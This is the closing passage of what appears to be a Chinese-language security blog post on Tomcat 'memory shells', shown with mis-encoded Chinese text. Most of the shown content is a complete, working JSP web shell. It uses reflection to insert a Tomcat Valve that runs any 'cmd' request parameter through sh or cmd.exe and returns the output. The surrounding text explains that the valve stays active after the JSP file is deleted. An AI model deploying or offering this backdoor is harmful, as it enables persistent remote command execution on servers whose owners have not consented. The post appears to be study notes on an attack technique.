<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">getNext</span>().<span style="color:#007f7f">invoke</span>(request, response);
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ•ˆæœ-3">æ•ˆæœ<a hidden class="anchor" aria-hidden="true" href="#æ•ˆæœ-3">#</a></h5>
<p>å®Œæ•´ä»£ç :</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.core.ContainerBase&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.core.StandardPipeline&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.connector.Response&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.valves.ValveBase&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;&lt;%--
</span></span><span style="display:flex;"><span>  Created by IntelliJ IDEA.
</span></span><span style="display:flex;"><span>  User: reus09
</span></span><span style="display:flex;"><span>  Date: 2023/4/16
</span></span><span style="display:flex;"><span>  Time: 11:36
</span></span><span style="display:flex;"><span>  To change this template use File | Settings | File Templates.
</span></span><span style="display:flex;"><span>--%&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%
</span></span><span style="display:flex;"><span>    Field requestField = request.getClass().getDeclaredField(&#34;request&#34;);
</span></span><span style="display:flex;"><span>    requestField.setAccessible(true);
</span></span><span style="display:flex;"><span>    final Request request1 = (Request) requestField.get(request);
</span></span><span style="display:flex;"><span>    StandardContext standardContext = (StandardContext) request1.getContext();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Field pipeline = ContainerBase.class.getDeclaredField(&#34;pipeline&#34;);
</span></span><span style="display:flex;"><span>    pipeline.setAccessible(true);
</span></span><span style="display:flex;"><span>    StandardPipeline standardPipeline = (StandardPipeline) pipeline.get(standardContext);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ValveBase valveBase = new ValveBase() {
</span></span><span style="display:flex;"><span>        @Override
</span></span><span style="display:flex;"><span>        public void invoke(Request request, Response response){
</span></span><span style="display:flex;"><span>            try {
</span></span><span style="display:flex;"><span>                if (request.getParameter(&#34;cmd&#34;) != null) {
</span></span><span style="display:flex;"><span>                    boolean isLinux = true;
</span></span><span style="display:flex;"><span>                    String osTyp = System.getProperty(&#34;os.name&#34;);
</span></span><span style="display:flex;"><span>                    if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {
</span></span><span style="display:flex;"><span>                        isLinux = false;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    String[] cmds = isLinux ? new String[]{&#34;sh&#34;, &#34;-c&#34;, request.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, request.getParameter(&#34;cmd&#34;)};
</span></span><span style="display:flex;"><span>                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
</span></span><span style="display:flex;"><span>                    Scanner s = new Scanner(in).useDelimiter(&#34;\\A&#34;);
</span></span><span style="display:flex;"><span>                    String output = s.hasNext() ? s.next() : &#34;&#34;;
</span></span><span style="display:flex;"><span>                    response.getWriter().write(&#34;Tomcat valve Injection Success !&#34;+output);
</span></span><span style="display:flex;"><span>                    response.getWriter().flush();
</span></span><span style="display:flex;"><span>                    this.getNext().invoke(request, response);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            } catch (Exception e) {
</span></span><span style="display:flex;"><span>                e.printStackTrace();
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    standardPipeline.addValve(valveBase);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>debugè°ƒè¯•ï¼Œå¯ä»¥å‘ç°å·²æˆåŠŸæ·»åŠ valveåˆ°ç»„ä»¶ä¸­ï¼Œ</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416114916448.png" alt="image-20230416114916448"  />
</p>
<p>åœ¨å·²çŸ¥è·¯å¾„ä¸‹åŠ <code>?cmd=command</code>å³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416114719263.png" alt="image-20230416114719263"  />
</p>
<h2 id="æ€»ç»“">æ€»ç»“<a hidden class="anchor" aria-hidden="true" href="#æ€»ç»“">#</a></h2>
<p>è¿™é‡Œå†…å­˜é©¬çš„æ„æ€æ˜¯ï¼Œæˆ‘ä»¬è®¿é—®<code>evil.jsp</code>ä¹‹åï¼Œå°†jspæ–‡ä»¶åˆ é™¤ä¹‹åï¼ŒæœåŠ¡å™¨åªè¦ä¸é‡å¯ï¼Œæˆ‘ä»¬æ·»åŠ è¿›å»çš„æ¶æ„ç»„ä»¶å°±å¯ä»¥ä¸€ç›´è¿è¡Œï¼Œè®¿é—®ä¸Šä¸‹æ–‡ç¯å¢ƒå°±èƒ½ç›´æ¥å¸¦ä¸Šå‚æ•°å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>ä½†æ˜¯è¿™ç§å®ç°æ–¹å¼ä¸¥æ ¼æ„ä¹‰ä¸Šä¸ç®—å†…å­˜é©¬ï¼Œåªæ˜¯çœ‹èµ·æ¥æ²¡äº†æ–‡ä»¶è€Œå·²ï¼Œå› ä¸º Web æœåŠ¡å™¨ä¸­çš„ jsp ç¼–è¯‘å™¨ä¼šç¼–è¯‘ç”Ÿæˆå¯¹åº”çš„ java æ–‡ä»¶ç„¶åè¿›è¡Œç¼–è¯‘åŠ è½½å¹¶å®ä¾‹åŒ–ï¼Œæ‰€ä»¥å®é™…ä¸Šè¿˜æ˜¯ä¼šè½åœ°çš„ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416122422359.png" alt="image-20230416122422359"  />
</p>
<p>ä¹‹åä¼šå­¦ä¹ åˆ©ç”¨ååºåˆ—åŒ–æ¥å®ç°çœŸæ­£æ„ä¹‰ä¸Šçš„å†…å­˜é©¬çš„æ³¨å…¥ï¼Œä»¥åŠé€šè¿‡agentæŠ€æœ¯å®ç°æ³¨å…¥å†…å­˜é©¬ã€‚</p>
<h2 id="å‚è€ƒ">å‚è€ƒ<a hidden class="anchor" aria-hidden="true" href="#å‚è€ƒ">#</a></h2>
<p><a href="https://xz.aliyun.com/t/11988">https://xz.aliyun.com/t/11988</a></p>
<p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a></p>
<p><a href="http://wjlshare.com/archives/1541">http://wjlshare.com/archives/1541</a></p>
<p><a href="https://su18.org/post/memory-shell/">https://su18.org/post/memory-shell/</a></p>
<p><a href="https://github.com/su18/MemoryShell/tree/main/">https://github.com/su18/MemoryShell/tree/main/</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">å†…å­˜é©¬</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="/posts/tech/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/">
    <span class="title">Â« Prev</span>
    <br>
    <span>Tomcatæ— æ–‡ä»¶å†…å­˜é©¬</span>
  </a>
  <a class="next" href="/posts/tech/java-agent%E5%AD%A6%E4%B9%A0/">
    <span class="title">Next Â»</span>
    <br>
    <span>Java Agentå­¦ä¹ </span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
